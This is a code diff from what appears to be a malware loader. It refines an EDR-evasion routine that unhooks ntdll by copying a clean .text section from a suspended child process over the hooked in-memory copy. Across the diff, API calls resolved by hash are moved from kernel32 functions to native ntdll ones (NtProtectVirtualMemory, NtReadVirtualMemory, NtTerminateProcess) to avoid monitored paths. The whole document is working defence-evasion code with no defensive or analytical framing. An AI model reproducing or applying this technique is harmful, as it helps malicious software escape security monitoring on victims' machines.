@@ -5,20 +5,20 @@
 
 
 BOOL evasion_unhook_ntdll_process_load_apis(void) {
-    
+
     if (!g_ldr->apis->CreateProcessA)
         g_ldr->apis->CreateProcessA = (pCreateProcessA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEPROCESSA);
-    if (!g_ldr->apis->VirtualProtect)
-        g_ldr->apis->VirtualProtect = (pVirtualProtect)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALPROTECT);
-    if (!g_ldr->apis->ReadProcessMemory)
-        g_ldr->apis->ReadProcessMemory = (pReadProcessMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_READPROCESSMEMORY);
-    if (!g_ldr->apis->TerminateProcess)
-        g_ldr->apis->TerminateProcess = (pTerminateProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_TERMINATEPROCESS);
-    if (!g_ldr->apis->CloseHandle)
-        g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
+    if (!g_ldr->apis->NtProtectVirtualMemory)
+        g_ldr->apis->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTPROTECTVIRTUALMEMORY);
+    if (!g_ldr->apis->NtReadVirtualMemory)
+        g_ldr->apis->NtReadVirtualMemory = (pNtReadVirtualMemory)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTREADVIRTUALMEMORY);
+    if (!g_ldr->apis->NtTerminateProcess)
+        g_ldr->apis->NtTerminateProcess = (pNtTerminateProcess)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTTERMINATEPROCESS);
+    if (!g_ldr->apis->NtCloseHandle)
+        g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCLOSE);
 
-    return (g_ldr->apis->CreateProcessA && g_ldr->apis->VirtualProtect &&
-        g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess && g_ldr->apis->CloseHandle);
+    return (g_ldr->apis->CreateProcessA && g_ldr->apis->NtProtectVirtualMemory &&
+        g_ldr->apis->NtReadVirtualMemory && g_ldr->apis->NtTerminateProcess && g_ldr->apis->NtCloseHandle);
 }
 
 BOOL is_ntdll_hooked() {
@@ -51,35 +51,46 @@ BOOL evasion_unhook_ntdll_process(void) {
             DWORD textSize = section[i].Misc.VirtualSize;
             PBYTE textAddr = ntdll + section[i].VirtualAddress;
 
-            PBYTE clean = (PBYTE)g_ldr->apis->LocalAlloc(LMEM_FIXED, textSize);
-            if (!clean) break;
+            PBYTE cleanBuf = (PBYTE)g_ldr->apis->LocalAlloc(LMEM_FIXED, textSize);
+            if (!cleanBuf) break;
 
             SIZE_T bytesRead = 0;
-            g_ldr->apis->ReadProcessMemory(pi.hProcess, textAddr, clean, textSize, &bytesRead);
+            g_ldr->apis->NtReadVirtualMemory(pi.hProcess, textAddr, cleanBuf, textSize, &bytesRead);
 
-            DWORD old = 0;
-            BOOL check = g_ldr->apis->VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &old);
-            if (!check) {
-                DBGA("VirtualProtect 1 failed: %lu\n", GetLastError());
+            PVOID protectAddr = textAddr;
+            SIZE_T protectSize = textSize;
+            ULONG old = 0;
+            NTSTATUS status = g_ldr->apis->NtProtectVirtualMemory(
+                (HANDLE)-1, &protectAddr, &protectSize,
+                PAGE_EXECUTE_READWRITE, &old);
+            if (status != 0) {
+                DBGA("NtProtectVirtualMemory 1 failed: 0x%lx\n", status);
+                g_ldr->apis->LocalFree(cleanBuf);
                 return FALSE;
             }
-            memcpy(textAddr, clean, textSize);
-            check = g_ldr->apis->VirtualProtect(textAddr, textSize, old, &old);
-            if (!check) {
-                DBGA("VirtualProtect 2 failed: %lu\n", GetLastError());
+
+            memcpy(textAddr, cleanBuf, textSize);
+
+            protectAddr = textAddr;
+            protectSize = textSize;
+            status = g_ldr->apis->NtProtectVirtualMemory(
+                (HANDLE)-1, &protectAddr, &protectSize,
+                old, &old);
+            if (status != 0) {
+                DBGA("NtProtectVirtualMemory 2 failed: 0x%lx\n", status);
+                g_ldr->apis->LocalFree(cleanBuf);
                 return FALSE;
             }
-            DBGA("[*] Unhooked ntdll via suspened process\n");
 
-            g_ldr->apis->LocalFree(clean);
+            DBGA("[*] Unhooked ntdll via suspended process\n");
+            g_ldr->apis->LocalFree(cleanBuf);
             break;
         }
     }
-    
-    
-    g_ldr->apis->TerminateProcess(pi.hProcess, 0);
-    g_ldr->apis->CloseHandle(pi.hProcess);
-    g_ldr->apis->CloseHandle(pi.hThread);
+
+    g_ldr->apis->NtTerminateProcess(pi.hProcess, 0);
+    g_ldr->apis->NtCloseHandle(pi.hProcess);
+    g_ldr->apis->NtCloseHandle(pi.hThread);
 
     return TRUE;
 }
